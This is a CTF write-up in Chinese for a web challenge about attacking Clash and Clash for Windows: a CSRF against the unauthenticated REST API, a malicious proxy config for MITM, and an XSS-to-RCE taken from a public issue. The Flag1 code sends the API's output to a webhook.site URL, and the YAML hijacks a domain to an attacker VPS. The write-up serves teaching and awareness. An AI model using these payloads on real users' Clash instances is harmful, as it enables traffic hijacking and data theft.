# [Web] 非法所得

- 命题人：thezzisu
- Flag 1：200 分
- Flag 2：200 分
- Flag 3：200 分

## 题目描述

<p>小太极是摆带信科的大四老狗。他的室友保研到了摆带原神学院，学术爱情双丰收；而
小太极除了和教务学会太极拳后，本科四年一无所成，单身的他被扫地出门，最终只得保研到 CMU（Changping Machikou University，现改名为新*园），离校前存放在活动室的个人物品还被别人清理掉了。</p>
<p>恼火之余，小太极看到室友的电脑桌面上，在原神图标下面居然有某蓝色软件。联想到承德某同行的经历，他豁然开朗：这一切居然是室友的非法所得。请你帮助小太极通过网络，找出他室友电脑上的三处证据，让老大哥vivo50w🫡</p>
<p><strong>补充说明：</strong></p>
<ul>
<li>可阅读源码中的 <code>prepare_flag.mjs</code> 等文件了解 Flag 的位置。</li>
<li>VNC 界面仅供观看，请点击网页其他处的按钮进行操作。</li>
</ul>
<div class="well">
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>可以看看 <a target="_blank" rel="noopener noreferrer" href="https://clash.gitbook.io/doc/restful-api">文档</a>。</li>
<li>原神学院官网被隐藏起来了，需要你<strong>自己</strong>去衡量。</li>
<li>这是一个古老版本的 CFW。可以看看 <a target="_blank" rel="noopener noreferrer" href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710">GitHub Issues</a>。</li>
</ul>
</div>

**【网页链接：访问题目网页】**

**【网页链接：访问北大网盘下载题目源码（约 113 MB，因为 Electron）】**

## 预期解法

这道题的预期非常明确。三个Flag分别对应Clash Core CSRF、Clash MITM、CFW XSS2RCE。为了降低难度，环境内Clash相关软件均为低版本。

### Flag1. Clash Core CSRF

Clash Core的Restful API是支持CORS的。这意味着，在**知道Clash Core Restful API Endpoint**、又**没有设置API Secret**的情况下，任何以HTTP协议加载的网页均可以直接通过Restful API操控Clash Core。（为什么需要HTTP？因为Chrome禁止了HTTPS网页通过XHR/Fetch加载HTTP资源。）Flag1就需要你利用这一点，通过Clash Core Restful API获取Flag。

```js
const resp = await fetch("http://127.0.0.1:9090/configs", {
  method: "PUT",
  body: JSON.stringify({
    path: "/app/profiles/flag.yml",
  }),
});
const resp = await fetch("http://127.0.0.1:9090/proxies");
fetch(`https://webhook.site/82e7ba76-58a2-4c74-9dfd-9ba166abf91a/123?` + encodeURIComponent(await resp.text()))
```

需要注意的是，Visit功能要求网址必须为`.pku.edu.cn`子域名。你可以利用homepage题的环境放置你的Payload，或者通过Flag2的做法解决。

### Flag2. Clash MITM

Clash Core可以劫持流量，而这意味着一个恶意的Clash配置将带来MITM攻击的风险。构造配置文件如下：

```yml
port: 7890
mode: Rule
log-level: info
external-controller: ':9090'
proxies:
  - name: 1
    type: socks5
    server: 127.0.0.1
    port: 1926
    skip-cert-verify: true
rules:
  - 'MATCH,DIRECT'
hosts:
  ys.pku.edu.cn: <YOUR-VPS-IP>
```

就可以劫持 `ys.pku.edu.cn` 到你的VPS上。由于访问使用的是HTTP，自己开一个80的HTTP服务即可。

### Flag3. CFW XSS2RCE

这个Flag其实是最简单的——直接复现[这个ISSUE](https://github.com/Fndroid/clash_for_windows_pkg/issues/2710)即可，甚至PoC都在里面有。是不是非常送分呢？

## 花絮

1. 这道题的灵感来源于一些攻防之中的蓝方反制措施。
2. CFW XSS2RCE这种重量级的漏洞影响面非常广。而CFW的作者又不遵守Electron安全实践，在渲染进程暴露Node API真的让人很难评价。如果你的CFW版本低，请尽快升级（虽然以后可能还会有洞就是了）。
3. Clash Core的Restful API也是比较危险的。很多服务器上大家开的Clash Core都没有设置API Secret，这意味着任何人都可以通过Restful API操控你的Clash Core。如果你的Clash Core版本低，还可能被复写配置文件做到RCE。
4. 虽然北大目前还没有原神学院，但`ys.pku.edu.cn`确实存在（DNS可以发现），但打不开。
